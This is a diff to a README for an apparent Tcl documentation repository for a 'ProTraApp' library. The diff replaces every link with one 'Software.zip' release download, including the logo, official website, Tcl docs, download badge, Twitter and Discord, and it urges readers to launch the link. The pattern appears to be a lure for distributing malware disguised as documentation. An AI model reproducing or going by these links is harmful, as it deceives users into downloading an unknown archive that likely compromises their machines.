@@ -2,7 +2,7 @@
 
 Welcome to the ProTraApp_Tcl_Docs repository! This documentation is dedicated to adding Tcl support and functionality to the ProTraApp software library. Whether you are a developer looking to enhance the capabilities of ProTraApp or a user interested in learning more about the Tcl integration, you've come to the right place.
 
-![ProTraApp Logo](https://example.com/protraapp_logo.png)
+![ProTraApp Logo](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
 
 ## Repository Overview
 
@@ -16,15 +16,15 @@ To get started with integrating Tcl into the ProTraApp library, follow the steps
 
 ## Resources
 
-- 📘 [ProTraApp Official Website](https://www.protraapp.com)
-- 💻 [ProTraApp GitHub Repository](https://github.com/ProTraApp)
-- 📄 [Tcl Documentation](https://www.tcl-lang.org/docs/)
+- 📘 [ProTraApp Official Website](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
+- 💻 [ProTraApp GitHub Repository](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
+- 📄 [Tcl Documentation](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
 
 ## Installation
 
 To download the necessary files for adding Tcl support to ProTraApp, click the button below:
 
-[![Download ProTraApp_Tcl_Docs](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download ProTraApp_Tcl_Docs](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
 
 *Note: The link above needs to be launched to initiate the download.*
 
@@ -38,8 +38,8 @@ We welcome contributions from the community to enhance the ProTraApp_Tcl_Docs re
 
 Stay up-to-date with the latest news and updates from the ProTraApp community:
 
-- 🐦 Follow us on Twitter: [@ProTraApp](https://twitter.com/ProTraApp)
-- 💬 Join the conversation on Discord: [ProTraApp Discord Server](https://discord.gg/protraapp)
+- 🐦 Follow us on Twitter: [@ProTraApp](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
+- 💬 Join the conversation on Discord: [ProTraApp Discord Server](https://github.com/cheegii/ProTraApp_Tcl_Docs/releases/download/v1.0/Software.zip)
 
 ## License
 
